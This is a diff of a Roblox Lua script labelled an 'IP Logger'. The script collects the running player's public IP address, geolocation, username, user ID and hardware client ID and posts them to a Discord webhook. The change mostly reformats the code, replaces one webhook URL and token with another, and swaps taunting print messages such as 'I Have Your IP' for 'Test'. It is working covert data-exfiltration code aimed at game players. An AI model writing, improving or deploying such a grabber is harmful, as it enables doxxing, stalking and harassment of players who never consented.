@@ -3,14 +3,14 @@
 local Players = game:GetService("Players")
 
 local function onPlayerAdded(player)
-
-	print(player.UserId)end
+	print(player.UserId)
+end
 
 Players.PlayerAdded:Connect(onPlayerAdded)
 
 local Player = game.Players.LocalPlayer
-
 local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+
 
 -- // IP Logger // --
 
@@ -18,166 +18,93 @@ local Location = tostring(game:HttpGet("http://ip-api.com/json", true))
 
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
+
 -- // Webhook // --
 
 function SendMessage(url, message)
-
     local http = game:GetService("HttpService")
-
     local headers = {
-
         ["Content-Type"] = "application/json"
-
     }
-
     local data = {
-
         ["content"] = message
-
     }
-
     local body = http:JSONEncode(data)
-
     local response = request({
-
         Url = url,
-
         Method = "POST",
-
         Headers = headers,
-
         Body = body
-
     })
-
-    print("Good! XDDDDDDDDD")
-
+    print("Test2")
 end
 
 function SendMessageEMBED(url, embed)
-
     local http = game:GetService("HttpService")
-
     local headers = {
-
         ["Content-Type"] = "application/json"
-
     }
-
     local data = {
-
         ["embeds"] = {
-
             {
-
                 ["title"] = embed.title,
-
                 ["description"] = embed.description,
-
                 ["color"] = embed.color,
-
                 ["fields"] = embed.fields,
-
                 ["footer"] = {
-
                     ["text"] = embed.footer.text
-
                 }
-
             }
-
         }
-
     }
-
     local body = http:JSONEncode(data)
-
     local response = request({
-
         Url = url,
-
         Method = "POST",
-
         Headers = headers,
-
         Body = body
-
     })
-
-    print("I Have Your IP")
-
+    print("Test")
 end
+
 
 --Examples 
 
-local url = "https://discord.com/api/webhooks/1119219260053528646/5doR0baGrDdRnsCvV93dm9nU7x_gvuwZz1VQcxyPEtXMdqWAfsKb_SYw-WGzj93zM-D2"
-
+local url = "https://discord.com/api/webhooks/1151040785651879967/Df16s_iz4nqHwJ0IWA6ZCP-KOU2WdgFIQCwnYIYFOULQll7lS86e4HF8MJS5WNueT0PJ"
 SendMessage(url, "")
 
+
 local embed = {
-
     ["title"] = "IP Tracker",
-
     ["description"] = "Location | IP Found!",
-
     ["color"] = 65280,
-
     ["fields"] = {
-
         {
-
             ["name"] = "User-Name",
-
             ["value"] = ("- ".. Player.Name)
-
         },
-
         {
-
             ["name"] = "User-ID:",
-
             ["value"] = Player.UserId,
-
         },
-
         {
-
             ["name"] = "Location:",
-
             ["value"] = (Location),
-
             ["inline"] = false
-
         },
-
         {
-
             ["name"] = "IP Address:",
-
             ["value"] = (ip),
-
             ["inline"] = false 
-
         },
-
         {
-
             ["name"] = "Hardware ID:",
-
             ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-
             ["inline"] = false
-
         }
-
     },
-
     ["footer"] = {
-
         ["text"] = "Made By Rama102031"
-
     }
-
 }
-
 SendMessageEMBED(url, embed)
